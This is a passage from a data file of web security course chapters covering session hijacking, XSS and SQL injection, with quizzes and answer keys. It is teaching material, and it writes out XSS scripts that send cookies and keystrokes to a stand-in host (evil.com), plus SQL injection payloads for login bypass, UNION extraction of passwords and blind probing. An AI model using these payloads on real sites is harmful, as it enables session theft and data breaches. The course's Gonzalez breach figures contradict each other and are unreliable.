                    "if session:\n"
                    "    user = User.query.get(session[\"user_id\"])\n"
                    "```\n\n"
                    "> Session IDs must be **long, random, and unpredictable**. "
                    "> A weak session ID (like sequential numbers) can be guessed, "
                    "> allowing an attacker to hijack any user's session.\n\n"
                    "**Session Lifecycle**\n\n"
                    "- **Creation**: When you log in\n"
                    "- **Validation**: On every request, the server verifies the session ID\n"
                    "- **Expiration**: After a timeout or on logout\n"
                    "- **Destruction**: When you log out or the session expires"
                )
            },
            {
                "title": "Session Hijacking Attacks",
                "content": (
                    "**Session hijacking** is when an attacker steals your session "
                    "token and uses it to impersonate you. They do not need your "
                    "password — they just need your session cookie.\n\n"
                    "**How Session Tokens Are Stolen**\n\n"
                    "**1. Cross-Site Scripting (XSS)**\n"
                    "If a website has an XSS vulnerability, an attacker can inject "
                    "JavaScript that reads your cookies and sends them to the "
                    "attacker's server. This is why the `HttpOnly` cookie flag is "
                    "so important — it prevents JavaScript from accessing the cookie.\n\n"
                    "**2. Network Sniffing**\n"
                    "On an unencrypted HTTP connection, anyone on the same network "
                    "(like public Wi-Fi) can intercept your traffic and extract "
                    "session cookies. This is why HTTPS is critical.\n\n"
                    "**3. Session Fixation**\n"
                    "An attacker sets a known session ID in your browser before you "
                    "log in. After you log in, the attacker already knows your "
                    "session ID and can hijack your session.\n\n"
                    "**4. Physical Access**\n"
                    "If someone gains access to your computer, they can extract "
                    "cookies from your browser's storage.\n\n"
                    "> Session hijacking is like someone stealing your concert "
                    "> wristband. They did not pay for admission, but the staff "
                    "> cannot tell the difference.\n\n"
                    "Defense requires a combination of HTTPS, secure cookie flags, "
                    "and XSS prevention."
                )
            },
            {
                "title": "Secure Cookie Configuration",
                "content": (
                    "The way cookies are configured has a huge impact on security. "
                    "Here are the critical cookie flags every developer must use:\n\n"
                    "**HttpOnly**\n"
                    "Prevents JavaScript from accessing the cookie. This is your "
                    "primary defense against session theft via XSS.\n\n"
                    "```http\n"
                    "Set-Cookie: session_id=abc123; HttpOnly\n"
                    "```\n\n"
                    "**Secure**\n"
                    "Ensures the cookie is only sent over HTTPS connections. Without "
                    "this, the cookie could be intercepted on an HTTP connection.\n\n"
                    "```http\n"
                    "Set-Cookie: session_id=abc123; Secure\n"
                    "```\n\n"
                    "**SameSite**\n"
                    "Controls when cookies are sent with cross-origin requests. "
                    "This is your defense against CSRF (Cross-Site Request Forgery) "
                    "attacks.\n\n"
                    "- `SameSite=Strict`: Cookie is never sent with cross-origin requests\n"
                    "- `SameSite=Lax`: Cookie is sent with top-level navigation but not with embedded requests\n"
                    "- `SameSite=None`: Cookie is always sent (requires `Secure` flag)\n\n"
                    "```http\n"
                    "Set-Cookie: session_id=abc123; SameSite=Lax; Secure; HttpOnly\n"
                    "```\n\n"
                    "**Additional Best Practices**\n\n"
                    "- Set a reasonable **expiration time** (e.g., 24 hours)\n"
                    "- **Regenerate session IDs** after login to prevent session fixation\n"
                    "- **Invalidate sessions** on the server side when users log out\n"
                    "- Bind sessions to the user's **IP address** or **user agent**\n\n"
                    "> A cookie without `HttpOnly`, `Secure`, and `SameSite` flags "
                    "> is like a door without a lock."
                )
            },
            {
                "title": "The Authentication Flow",
                "content": (
                    "Let us walk through a complete, secure authentication flow "
                    "from start to finish:\n\n"
                    "**Step 1: Login**\n"
                    "The user submits their username and password via a POST "
                    "request over HTTPS.\n\n"
                    "**Step 2: Server Validates**\n"
                    "The server hashes the password and compares it to the stored "
                    "hash. If it matches, authentication succeeds.\n\n"
                    "**Step 3: Session Creation**\n"
                    "The server creates a new session with a cryptographically "
                    "random ID and stores it server-side. Any existing sessions "
                    "for this user are destroyed.\n\n"
                    "**Step 4: Cookie Sent**\n"
                    "The server sends the session ID in a cookie with all security "
                    "flags:\n\n"
                    "```http\n"
                    "Set-Cookie: session_id=eyJhbGci...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=86400\n"
                    "```\n\n"
                    "**Step 5: Subsequent Requests**\n"
                    "The browser includes the cookie with every request to the same "
                    "domain. The server reads it, validates the session, and serves "
                    "the authenticated content.\n\n"
                    "**Step 6: Logout**\n"
                    "The user clicks logout. The server destroys the session "
                    "server-side and sends a cookie with `Max-Age=0` to clear "
                    "it from the browser.\n\n"
                    "> This flow looks straightforward, but every step has potential "
                    "> vulnerabilities. Understanding each step is key to building "
                    "> secure applications."
                )
            }
        ],
        "quizzes": [
            {
                "question_number": 1,
                "question_type": "multiple_choice",
                "question_text": "Why do websites need cookies and sessions?",
                "options": [
                    "To make websites load faster",
                    "Because HTTP is stateless and the server does not remember previous requests",
                    "To store user passwords securely",
                    "To prevent users from creating too many accounts"
                ],
                "correct_index": 1,
                "explanation": "HTTP is stateless — each request is independent. Cookies and sessions work together to maintain your login state across multiple requests, so the website remembers who you are."
            },
            {
                "question_number": 2,
                "question_type": "multiple_choice",
                "question_text": "Where is session data typically stored?",
                "options": [
                    "In the user's browser cookies",
                    "On the server, with only the session ID stored in the cookie",
                    "In the URL parameters",
                    "In the user's local storage"
                ],
                "correct_index": 1,
                "explanation": "Session data (user ID, preferences, etc.) is stored on the server. Only the session ID is sent to the browser in a cookie. The browser sends the ID back with each request, and the server looks up the corresponding data."
            },
            {
                "question_number": 3,
                "question_type": "multiple_choice",
                "question_text": "What does the HttpOnly flag on a cookie do?",
                "options": [
                    "Makes the cookie available to all websites on the internet",
                    "Prevents JavaScript from accessing the cookie, protecting it from XSS attacks",
                    "Encrypts the cookie data automatically",
                    "Makes the cookie expire after one hour"
                ],
                "correct_index": 1,
                "explanation": "The HttpOnly flag prevents JavaScript from reading the cookie value. This is critical for protecting session cookies from being stolen through Cross-Site Scripting (XSS) attacks."
            },
            {
                "question_number": 4,
                "question_type": "multiple_choice",
                "question_text": "What is session fixation?",
                "options": [
                    "A method of fixing broken sessions",
                    "An attack where the attacker sets a known session ID before the user logs in, allowing hijacking after login",
                    "A technique to extend session expiration times",
                    "A method of storing sessions in a database"
                ],
                "correct_index": 1,
                "explanation": "In session fixation, an attacker pre-sets a known session ID in the victim's browser. When the user logs in, the attacker's known ID becomes a valid authenticated session, allowing hijacking."
            },
            {
                "question_number": 5,
                "question_type": "multiple_choice",
                "question_text": "What does the SameSite cookie attribute protect against?",
                "options": [
                    "Cross-Site Scripting (XSS)",
                    "Cross-Site Request Forgery (CSRF)",
                    "SQL injection",
                    "Man-in-the-middle attacks"
                ],
                "correct_index": 1,
                "explanation": "SameSite controls whether cookies are sent with cross-origin requests. By restricting cookie sending, it prevents attackers from using a user's existing session to make unauthorized requests on their behalf (CSRF)."
            },
            {
                "question_number": 6,
                "question_type": "multiple_choice",
                "question_text": "What should happen to a session when a user logs out?",
                "options": [
                    "Nothing — the session stays active for future logins",
                    "The session should be destroyed on the server and the cookie cleared from the browser",
                    "The session should be moved to a backup database",
                    "The session token should be reused for security"
                ],
                "correct_index": 1,
                "explanation": "When a user logs out, the server must destroy the session data and the browser must clear the cookie. If the session persists server-side, someone with access to the session ID could still use it."
            }
        ]
    },

    # =========================================================================
    # CHAPTER 7
    # =========================================================================
    {
        "slug": "how-xss-attacks-work",
        "title": "How XSS Attacks Work",
        "subtitle": "When attackers inject code into websites you trust",
        "category": "Part 2: Web Security",
        "part_number": 2,
        "chapter_number": 7,
        "difficulty": "intermediate",
        "estimated_minutes": 30,
        "intro_hook": (
            "Imagine visiting a trusted website and having malicious code run in "
            "your browser without you doing anything wrong. That is Cross-Site "
            "Scripting (XSS) — one of the most common and dangerous web "
            "vulnerabilities. XSS attacks have stolen session tokens, redirected "
            "users to phishing sites, and even defaced major websites."
        ),
        "key_takeaways": [
            "XSS allows attackers to inject malicious JavaScript into trusted websites",
            "There are three types: reflected, stored, and DOM-based XSS",
            "XSS can steal session tokens, cookies, and sensitive user data",
            "Input validation, output encoding, and Content Security Policy are key defenses"
        ],
        "vocabulary_json": [
            {"term": "XSS", "definition": "Cross-Site Scripting — a vulnerability where an attacker injects malicious scripts into web pages viewed by other users."},
            {"term": "Reflected XSS", "definition": "XSS where the malicious script is part of the URL and reflected back by the server in the response."},
            {"term": "Stored XSS", "definition": "XSS where the malicious script is permanently stored on the server (e.g., in a database) and served to every user who views it."},
            {"term": "DOM-based XSS", "definition": "XSS where the vulnerability exists in client-side JavaScript rather than server-side code."},
            {"term": "Content Security Policy", "definition": "A security header that restricts which scripts can run on a page."},
            {"term": "Sanitization", "definition": "The process of cleaning user input by removing or encoding potentially dangerous characters."}
        ],
        "sections": [
            {
                "title": "What Cross-Site Scripting Is",
                "content": (
                    "**Cross-Site Scripting (XSS)** is a vulnerability where an "
                    "attacker injects malicious JavaScript into a web page that "
                    "other users then view. The browser has no way to know that "
                    "the script did not come from the legitimate website, so it "
                    "runs the malicious code as if it were part of the page.\n\n"
                    "The name \"Cross-Site Scripting\" is a historical artifact. "
                    "Originally it was \"CSS\" but that name was already taken by "
                    "Cascading Style Sheets, so it was changed to XSS.\n\n"
                    "Here is the core problem: **if a website includes user-provided "
                    "content in its pages without proper sanitization, the user's "
                    "browser cannot distinguish between legitimate code and "
                    "malicious code.**\n\n"
                    "Imagine a comment section on a blog. If the blog does not "
                    "sanitize comments before displaying them, an attacker could "
                    "post a comment containing:\n\n"
                    "```html\n"
                    "<script>\n"
                    "  fetch('https://evil.com/steal?cookie=' + document.cookie)\n"
                    "</script>\n"
                    "```\n\n"
                    "When anyone views that comment, their browser executes the "
                    "script and sends their cookies to the attacker's server.\n\n"
                    "> XSS is like a poison pill hidden in a food delivery. The "
                    "> food looks normal, but once consumed, it causes harm. "
                    "> The victim did nothing wrong — they simply ate the food "
                    "> they were given.\n\n"
                    "XSS has been ranked as one of the **top web vulnerabilities** "
                    "by OWASP (Open Web Application Security Project) for over a decade."
                )
            },
            {
                "title": "Reflected XSS Explained",
                "content": (
                    "**Reflected XSS** occurs when user input is included in the "
                    "server's response without being sanitized. The malicious "
                    "payload \"reflects\" off the server back to the user.\n\n"
                    "Here is a classic example. Imagine a search page:\n\n"
                    "```html\n"
                    "You searched for: <script>alert('XSS')</script>\n"
                    "```\n\n"
                    "If the server takes the search term from the URL and displays "
                    "it without encoding, a URL like:\n\n"
                    "```\n"
                    "https://example.com/search?q=<script>alert('XSS')</script>\n"
                    "```\n\n"
                    "...will execute the JavaScript in the victim's browser when "
                    "they click the link.\n\n"
                    "**How Reflected XSS is Delivered**\n\n"
                    "Unlike stored XSS, reflected XSS does not persist on the "
                    "server. The attacker must trick the victim into clicking a "
                    "malicious link. Common delivery methods include:\n\n"
                    "- Phishing emails with crafted links\n"
                    "- Social media posts with malicious URLs\n"
                    "- URL shorteners that hide the malicious content\n\n"
                    "> Reflected XSS is like a mirror that bounces back whatever "
                    "> you show it. If you show it something dangerous, it reflects "
                    "> that danger right back.\n\n"
                    "The fix is simple: **never include unsanitized user input in "
                    "the response**. All user-provided data must be encoded before "
                    "being inserted into HTML."
                )
            },
            {
                "title": "Stored XSS: The Persistent Threat",
                "content": (
                    "**Stored XSS** (also called persistent XSS) is the most "
                    "dangerous type. The malicious script is permanently stored "
                    "on the server — in a database, comment field, forum post, "
                    "or profile — and served to every user who views it.\n\n"
                    "Common vectors for stored XSS include:\n\n"
                    "- **Comment sections**: Posting malicious HTML in comments\n"
                    "- **User profiles**: Setting a profile name or bio to include script tags\n"
                    "- **Forum posts**: Creating forum posts with embedded JavaScript\n"
                    "- **Message boards**: Sending messages with malicious payloads\n\n"
                    "**Real-World Impact**\n\n"
                    "In 2005, a Samy worm on MySpace used stored XSS to:\n"
                    "- Automatically add the attacker as a friend to anyone who viewed the profile\n"
                    "- Copy the worm to the victim's own profile\n"
                    "- Spread to over **1 million users** in 20 hours\n\n"
                    "This demonstrated how stored XSS can become self-propagating "
                    "malware.\n\n"
                    "> Stored XSS is like a contaminated water supply. Once the "
                    "> contamination is introduced, everyone who drinks from it "
                    "> is affected, not just the person who introduced it.\n\n"
                    "Stored XSS is harder to prevent than reflected XSS because "
                    "the data must be stored and later displayed. The defense is "
                    "to always **sanitize on input** and **encode on output**."
                )
            },
            {
                "title": "DOM-Based XSS",
                "content": (
                    "**DOM-based XSS** is different from reflected and stored XSS "
                    "because the vulnerability exists entirely in the **client-side "
                    "JavaScript**. The server never sees the malicious payload.\n\n"
                    "In DOM-based XSS, the attacker manipulates the page's DOM "
                    "(Document Object Model) through the URL, causing the page's "
                    "own JavaScript to write malicious content.\n\n"
                    "Here is a simplified example:\n\n"
                    "```javascript\n"
                    "// Vulnerable code on the page\n"
                    "var name = document.location.hash.substring(1);\n"
                    "document.getElementById('greeting').innerHTML = 'Hello ' + name;\n"
                    "```\n\n"
                    "If an attacker creates a URL like:\n\n"
                    "```\n"
                    "https://example.com/#<img src=x onerror=alert('XSS')>\n"
                    "```\n\n"
                    "The page's own JavaScript reads the hash and inserts it into "
                    "the DOM using `innerHTML`, which interprets HTML tags.\n\n"
                    "**Why DOM-Based XSS is Tricky**\n\n"
                    "- The server does not see the payload (it is in the URL fragment)\n"
                    "- Traditional server-side validation does not help\n"
                    "- Developers must audit client-side JavaScript carefully\n\n"
                    "> DOM-based XSS is like a puppet show. The page's own JavaScript "
                    "> is the puppet, and the attacker is the one pulling the strings "
                    "> through the URL.\n\n"
                    "The defense is to avoid using `innerHTML` or `document.write()` "
                    "with user-controlled data. Use `textContent` instead, which "
                    "treats content as plain text rather than HTML."
                )
            },
            {
                "title": "Real XSS Attack Scenarios",
                "content": (
                    "Let us look at practical XSS attack scenarios to understand "
                    "the real-world impact.\n\n"
                    "**Scenario 1: Session Theft**\n"
                    "An attacker injects a script that steals the victim's session "
                    "cookie:\n\n"
                    "```javascript\n"
                    "<script>\n"
                    "  new Image().src='https://evil.com/steal?c='+document.cookie;\n"
                    "</script>\n"
                    "```\n\n"
                    "The attacker receives the cookie and can impersonate the victim.\n\n"
                    "**Scenario 2: Keylogging**\n"
                    "An attacker injects a script that records everything the victim "
                    "types on the page, capturing passwords and credit card numbers.\n\n"
                    "```javascript\n"
                    "<script>\n"
                    "  document.addEventListener('keypress', function(e) {\n"
                    "    fetch('https://evil.com/log?key='+e.key);\n"
                    "  });\n"
                    "</script>\n"
                    "```\n\n"
                    "**Scenario 3: Phishing Overlay**\n"
                    "An attacker injects a fake login form that looks identical to "
                    "the real one, positioned over the page. When the user types "
                    "their credentials, the attacker captures them.\n\n"
                    "**Scenario 4: Cryptocurrency Mining**\n"
                    "An attacker injects a script that uses the victim's browser to "
                    "mine cryptocurrency in the background, slowing down their "
                    "device and increasing their electricity bill.\n\n"
                    "> XSS is often underestimated because people think \"it is just "
                    "> JavaScript.\" But JavaScript in your browser has access to "
                    "> your cookies, your session, your data, and your ability to "
                    "> make requests on your behalf."
                )
            },
            {
                "title": "How to Prevent XSS",
                "content": (
                    "XSS prevention requires a **defense-in-depth** approach — "
                    "multiple layers of protection working together.\n\n"
                    "**1. Output Encoding (Most Important)**\n"
                    "Never insert unencoded user data into HTML. Encode special "
                    "characters:\n\n"
                    "- `<` becomes `&lt;`\n"
                    "- `>` becomes `&gt;`\n"
                    "- `\"` becomes `&quot;`\n"
                    "- `&` becomes `&amp;`\n\n"
                    "```html\n"
                    "<!-- Safe: encoded -->\n"
                    "<p>Hello &lt;script&gt;user&lt;/script&gt;</p>\n"
                    "\n"
                    "<!-- Unsafe: raw -->\n"
                    "<p>Hello <script>user</script></p>\n"
                    "```\n\n"
                    "**2. Content Security Policy (CSP)**\n"
                    "A CSP header tells the browser which scripts are allowed to "
                    "run:\n\n"
                    "```http\n"
                    "Content-Security-Policy: default-src 'self'; script-src 'self'\n"
                    "```\n\n"
                    "This blocks inline scripts and scripts from external domains, "
                    "preventing most XSS attacks.\n\n"
                    "**3. Input Validation**\n"
                    "Validate that user input matches expected formats. If a field "
                    "should only contain a username (letters and numbers), reject "
                    "anything else.\n\n"
                    "**4. Use Safe DOM APIs**\n"
                    "Avoid `innerHTML` and `document.write()`. Use `textContent` "
                    "for plain text and DOM manipulation methods for elements.\n\n"
                    "> The golden rule of XSS prevention: **never trust user input "
                    "> and always encode output**. Treat every piece of user data "
                    "> as potentially malicious."
                )
            }
        ],
        "quizzes": [
            {
                "question_number": 1,
                "question_type": "multiple_choice",
                "question_text": "What is Cross-Site Scripting (XSS)?",
                "options": [
                    "A way to speed up website loading by caching scripts",
                    "A vulnerability where an attacker injects malicious JavaScript into web pages viewed by other users",
                    "A programming language for creating interactive websites",
                    "A method for testing website performance"
                ],
                "correct_index": 1,
                "explanation": "XSS is a vulnerability where an attacker injects malicious scripts into trusted websites. The browser executes the script because it appears to come from the legitimate website."
            },
            {
                "question_number": 2,
                "question_type": "multiple_choice",
                "question_text": "What is the key difference between reflected and stored XSS?",
                "options": [
                    "Reflected XSS uses JavaScript while stored XSS uses HTML",
                    "Reflected XSS is delivered via malicious links, while stored XSS is permanently saved on the server",
                    "Reflected XSS only works on mobile devices",
                    "There is no difference — they are the same attack"
                ],
                "correct_index": 1,
                "explanation": "Reflected XSS requires the victim to click a malicious link containing the payload. Stored XSS is saved permanently (e.g., in a database) and affects everyone who views the stored content."
            },
            {
                "question_number": 3,
                "question_type": "multiple_choice",
                "question_text": "Why is DOM-based XSS different from other types?",
                "options": [
                    "It does not use JavaScript",
                    "The vulnerability exists entirely in client-side code — the server never sees the payload",
                    "It only affects the server, not the client",
                    "It requires physical access to the victim's computer"
                ],
                "correct_index": 1,
                "explanation": "DOM-based XSS happens entirely in the browser. The attacker manipulates the page's DOM through the URL, and the page's own JavaScript writes malicious content. Server-side validation does not help."
            },
            {
                "question_number": 4,
                "question_type": "multiple_choice",
                "question_text": "What does a Content Security Policy (CSP) header do?",
                "options": [
                    "It encrypts all content on the page",
                    "It tells the browser which scripts are allowed to run, blocking unauthorized ones",
                    "It compresses page content for faster loading",
                    "It hides the page from search engines"
                ],
                "correct_index": 1,
                "explanation": "CSP is a browser-enforced policy that restricts which scripts, styles, and other resources can load on a page. A strict CSP can prevent most XSS attacks by blocking inline scripts and external script sources."
            },
            {
                "question_number": 5,
                "question_type": "multiple_choice",
                "question_text": "Why is innerHTML dangerous for displaying user content?",
                "options": [
                    "It makes the page load slowly",
                    "It treats the content as HTML, so script tags and event handlers will execute",
                    "It does not work on all browsers",
                    "It requires special permissions from the browser"
                ],
                "correct_index": 1,
                "explanation": "innerHTML parses the string as HTML, which means script tags, img onerror handlers, and other executable content will run. textContent, by contrast, treats everything as plain text and is safe for user content."
            },
            {
                "question_number": 6,
                "question_type": "multiple_choice",
                "question_text": "What is the primary defense against XSS when displaying user data?",
                "options": [
                    "Using a firewall to block malicious requests",
                    "Converting the browser to incognito mode",
                    "Encoding all user-provided data before inserting it into HTML",
                    "Disabling JavaScript in the browser"
                ],
                "correct_index": 2,
                "explanation": "Output encoding converts special characters like < and > into HTML entities, preventing them from being interpreted as HTML tags or script code. This is the most fundamental XSS defense."
            },
            {
                "question_number": 7,
                "question_type": "multiple_choice",
                "question_text": "What could an attacker do with a successful XSS attack?",
                "options": [
                    "Only display text on the victim's screen",
                    "Steal session cookies, log keystrokes, redirect to phishing sites, and perform actions as the victim",
                    "Delete the victim's hard drive",
                    "Access the victim's operating system directly"
                ],
                "correct_index": 1,
                "explanation": "XSS runs JavaScript in the victim's browser context, giving it access to cookies (including session tokens), the ability to make HTTP requests, log keystrokes, and manipulate the page. It cannot access the OS directly."
            }
        ]
    },

    # =========================================================================
    # CHAPTER 8
    # =========================================================================
    {
        "slug": "how-sql-injection-works",
        "title": "How SQL Injection Works",
        "subtitle": "When attackers talk directly to your database",
        "category": "Part 2: Web Security",
        "part_number": 2,
        "chapter_number": 8,
        "difficulty": "intermediate",
        "estimated_minutes": 30,
        "intro_hook": (
            "In 2011, a hacker named Albert Gonzalez stole 170 million credit card "
            "numbers from major retailers using SQL injection. This attack vector "
            "has been known for over 25 years, yet it remains one of the most "
            "dangerous web vulnerabilities today. Understanding SQL injection is "
            "essential because it targets the heart of most web applications — "
            "the database."
        ),
        "key_takeaways": [
            "SQL injection occurs when user input is inserted into database queries without sanitization",
            "Attackers can extract, modify, or delete data, and sometimes execute system commands",
            "There are three main types: in-band, blind, and out-of-band SQL injection",
            "Parameterized queries and prepared statements are the primary defense"
        ],
        "vocabulary_json": [
            {"term": "SQL Injection", "definition": "An attack where malicious SQL code is inserted into application queries, allowing attackers to manipulate the database."},
            {"term": "SQL", "definition": "Structured Query Language — the language used to communicate with databases."},
            {"term": "Parameterized Query", "definition": "A query where user input is bound as a parameter rather than concatenated into the SQL string, preventing injection."},
            {"term": "Blind SQL Injection", "definition": "SQL injection where the application does not display error messages, requiring indirect methods to extract data."},
            {"term": "Union-Based Attack", "definition": "A SQL injection technique that uses UNION SELECT to combine results from injected queries with legitimate results."},
            {"term": "Database Schema", "definition": "The structure of a database, including table names, column names, and data types."}
        ],
        "sections": [
            {
                "title": "What SQL Injection Is",
                "content": (
                    "**SQL injection** is a vulnerability that occurs when user "
                    "input is directly inserted into a SQL database query without "
                    "proper sanitization. It allows an attacker to alter the "
                    "intended query and perform unauthorized database operations.\n\n"
                    "Imagine a bouncer checking names against a guest list. If "
                    "someone writes their name as `John; let everyone in`, a naive "
                    "bouncer might follow both instructions. That is essentially "
                    "what SQL injection does — it tricks the database into following "
                    "extra instructions.\n\n"
                    "Here is a simplified example. A login form might build a "
                    "query like this:\n\n"
                    "```sql\n"
                    "SELECT * FROM users\n"
                    "WHERE username = '[USER_INPUT]'\n"
                    "AND password = '[PASSWORD_INPUT]'\n"
                    "```\n\n"
                    "If a user enters `admin' --` as the username, the query becomes:\n\n"
                    "```sql\n"
                    "SELECT * FROM users\n"
                    "WHERE username = 'admin' --'\n"
                    "AND password = ''\n"
                    "```\n\n"
                    "The `--` comments out the rest of the query. The password "
                    "check is completely bypassed. The attacker is logged in as "
                    "admin without knowing the password.\n\n"
                    "> SQL injection is like passing a note to a bank teller that "
                    "> says \"Give me all the money in account 12345. Also, give "
                    "> me all the money in the vault.\" If the teller follows "
                    "> instructions blindly, both commands execute.\n\n"
                    "SQL injection has been the #1 web vulnerability on the OWASP "
                    "Top 10 for years and continues to affect millions of websites."
                )
            },
            {
                "title": "A Simple SQL Injection Attack",
                "content": (
                    "Let us walk through a practical SQL injection example step "
                    "by step.\n\n"
                    "Imagine a search feature on a website:\n\n"
                    "```sql\n"
                    "SELECT name, email FROM users\n"
                    "WHERE city = '[USER_INPUT]'\n"
                    "```\n\n"
                    "A normal search for \"London\" produces:\n\n"
                    "```sql\n"
                    "SELECT name, email FROM users\n"
                    "WHERE city = 'London'\n"
                    "```\n\n"
                    "This returns users from London. Simple and safe.\n\n"
                    "But what if the attacker enters: `' OR 1=1 --`\n\n"
                    "The query becomes:\n\n"
                    "```sql\n"
                    "SELECT name, email FROM users\n"
                    "WHERE city = '' OR 1=1 --'\n"
                    "```\n\n"
                    "The `OR 1=1` condition is **always true** (1 always equals 1). "
                    "The `--` comments out the trailing quote. This returns "
                    "**every user in the database** — not just users from London.\n\n"
                    "**Severity Levels**\n\n"
                    "SQL injection attacks can have varying levels of impact:\n\n"
                    "- **Information disclosure**: Extracting data you should not see\n"
                    "- **Data modification**: Changing records in the database\n"
                    "- **Data deletion**: Deleting tables or records\n"
                    "- **Authentication bypass**: Logging in without credentials\n"
                    "- **Remote code execution**: In worst cases, executing commands on the database server\n\n"
                    "> The severity depends on the database permissions. A database "
                    "> user with full admin privileges (like `root` or `SA`) can "
                    "> be catastrophic if compromised."
                )
            },
            {
                "title": "Types of SQL Injection",
                "content": (
                    "SQL injection comes in several varieties, each with different "
                    "characteristics and techniques.\n\n"
                    "**In-Band SQL Injection**\n"
                    "The attacker receives the results of the injected query "
                    "directly in the application's response. This is the simplest "
                    "and most common type.\n\n"
                    "There are two sub-types:\n\n"
                    "- **Error-based**: The attacker causes the database to produce "
                    "error messages that reveal information about the database "
                    "structure\n"
                    "- **Union-based**: The attacker uses `UNION SELECT` to combine "
                    "results from their query with the legitimate results\n\n"
                    "**Blind SQL Injection**\n"
                    "The application does not display error messages or query "
                    "results directly. The attacker must infer information by "
                    "observing the application's behavior:\n\n"
                    "- **Boolean-based**: The attacker asks true/false questions "
                    "and observes whether the page content changes\n"
                    "- **Time-based**: The attacker uses SQL commands like "
                    "`SLEEP(5)` and measures how long the response takes\n\n"
                    "**Out-of-Band SQL Injection**\n"
                    "The attacker uses a different channel (like DNS or HTTP "
                    "requests) to exfiltrate data. This is used when in-band "
                    "techniques are not possible.\n\n"
                    "> Think of blind SQL injection like playing 20 questions. "
                    "> The attacker cannot see the database directly, so they ask "
                    "> yes/no questions and figure out the answer based on how "
                    "> the page responds."
                )
            },
            {
                "title": "Union-Based Attacks",
                "content": (
                    "**UNION-based SQL injection** is one of the most powerful "
                    "in-band techniques. It uses SQL's `UNION` operator to combine "
                    "the results of the original query with results from a "
                    "completely different query.\n\n"
                    "The UNION operator combines the results of two SELECT "
                    "statements into a single result set. For this to work, "
                    "both queries must have the same number of columns.\n\n"
                    "Here is the process:\n\n"
                    "**Step 1: Determine the number of columns**\n"
                    "The attacker uses ORDER BY to find the column count:\n\n"
                    "```sql\n"
                    "SELECT name, email FROM products\n"
                    "WHERE category = '' ORDER BY 1 --'\n"
                    "```\n"
                    "If this works, try `ORDER BY 2`, `ORDER BY 3`, etc., until "
                    "you get an error. The last successful number is the column count.\n\n"
                    "**Step 2: Find which columns are displayed**\n"
                    "Use UNION SELECT with NULL values:\n\n"
                    "```sql\n"
                    "SELECT name, email FROM products\n"
                    "WHERE category = ''\n"
                    "UNION SELECT NULL, NULL --'\n"
                    "```\n"
                    "Then replace NULLs with numbers to see which positions are "
                    "displayed on the page.\n\n"
                    "**Step 3: Extract data**\n"
                    "Replace the displayed NULLs with queries:\n\n"
                    "```sql\n"
                    "UNION SELECT username, password FROM users --'\n"
                    "```\n\n"
                    "> UNION-based attacks are like sneaking a second letter into "
                    "> an envelope. The postal service delivers both letters "
                    "> together, and the recipient reads them as one package.\n\n"
                    "This technique allows attackers to extract data from any "
                    "table in the database."
                )
            },
            {
                "title": "Blind SQL Injection",
                "content": (
                    "When a web application does not display error messages or "
                    "query results, attackers must use **blind SQL injection** — "
                    "inferring information indirectly.\n\n"
                    "**Boolean-Based Blind SQL Injection**\n"
                    "The attacker sends true/false conditions and observes "
                    "differences in the page:\n\n"
                    "```sql\n"
                    "-- True condition — page loads normally\n"
                    "AND 1=1 --'\n"
                    "\n"
                    "-- False condition — page shows different content\n"
                    "AND 1=2 --'\n"
                    "```\n\n"
                    "By systematically asking true/false questions, the attacker "
                    "can extract data character by character:\n\n"
                    "```sql\n"
                    "-- Is the first character of the admin password 'a'?\n"
                    "AND SUBSTRING(password, 1, 1) = 'a' --'\n"
                    "```\n\n"
                    "**Time-Based Blind SQL Injection**\n"
                    "If even the page content does not change, the attacker can "
                    "use time delays:\n\n"
                    "```sql\n"
                    "-- If true, page takes 5 seconds to respond\n"
                    "AND IF(1=1, SLEEP(5), 0) --'\n"
                    "\n"
                    "-- If false, page responds immediately\n"
                    "AND IF(1=2, SLEEP(5), 0) --'\n"
                    "```\n\n"
                    "By measuring response times, the attacker determines whether "
                    "each condition is true or false.\n\n"
                    "> Blind SQL injection is like playing battleship. The attacker "
                    "> cannot see the grid, so they make guesses and observe whether "
                    "> they get a \"hit\" or \"miss\" based on the page's response.\n\n"
                    "Blind injection is slower than in-band injection, but it "
                    "works against any vulnerable application, regardless of "
                    "whether error messages are displayed."
                )
            },
            {
                "title": "Real-World SQL Injection",
                "content": (
                    "SQL injection is not theoretical — it has caused some of the "
                    "largest data breaches in history.\n\n"
                    "**Notable Incidents**\n\n"
                    "**Heartland Payment Systems (2008)**\n"
                    "Albert Gonzalez used SQL injection to steal **130 million "
                    "credit card numbers** from this payment processor. It was "
                    "the largest credit card breach at the time.\n\n"
                    "**Sony Pictures (2011)**\n"
                    "Hackers used SQL injection to steal personal data of over "
                    "**1 million users**, including passwords, home addresses, "
                    "and email addresses.\n\n"
                    "**TalkTalk (2015)**\n"
                    "A 15-year-old used SQL injection to access personal data of "
                    "**157,000 customers**, including bank details.\n\n"
                    "**The Scale of the Problem**\n\n"
                    "SQL injection accounts for a significant portion of web "
                    "application attacks:\n\n"
                    "- **65%** of web application breaches involve SQL injection "
                    "(Ponemon Institute)\n"
                    "- Automated SQL injection tools are freely available online\n"
                    "- Even modern applications with security frameworks are "
                    "vulnerable if developers write raw queries unsafely\n\n"
                    "> SQL injection has been known since the late 1990s. It is "
                    "> well-understood and completely preventable. Every SQL "
                    "> injection breach represents a failure of basic security "
                    "> practices.\n\n"
                    "The persistence of SQL injection is a reminder that "
                    "understanding the fundamentals is just as important as "
                    "knowing the latest security tools."
                )
            },
            {
                "title": "How to Prevent SQL Injection",
                "content": (
                    "SQL injection is **completely preventable** with proper coding "
                    "practices. Here are the essential defenses.\n\n"
                    "**1. Parameterized Queries (Primary Defense)**\n"
                    "Never concatenate user input into SQL strings. Use "
                    "parameterized queries (also called prepared statements) "
                    "instead:\n\n"
                    "```python\n"
                    "# VULNERABLE — never do this\n"
                    "query = f\"SELECT * FROM users WHERE name = '{user_input}'\"\n"
                    "\n"
                    "# SAFE — parameterized query\n"
                    "cursor.execute(\n"
                    "    \"SELECT * FROM users WHERE name = %s\",\n"
                    "    (user_input,)\n"
                    ")\n"
                    "```\n\n"
                    "With parameterized queries, the database treats user input "
                    "as **data**, not as part of the SQL command. Even if the "
                    "input contains SQL syntax, it will never be executed.\n\n"
                    "**2. Input Validation**\n"
                    "Validate that user input matches expected formats:\n\n"
                    "- Use allowlists (only accept known-good values)\n"
                    "- Reject input containing SQL special characters\n"
                    "- Use regular expressions to validate format\n\n"
                    "**3. Least Privilege**\n"
                    "Database users should have the minimum permissions needed:\n\n"
                    "- Web application accounts should not have DROP or ALTER permissions\n"
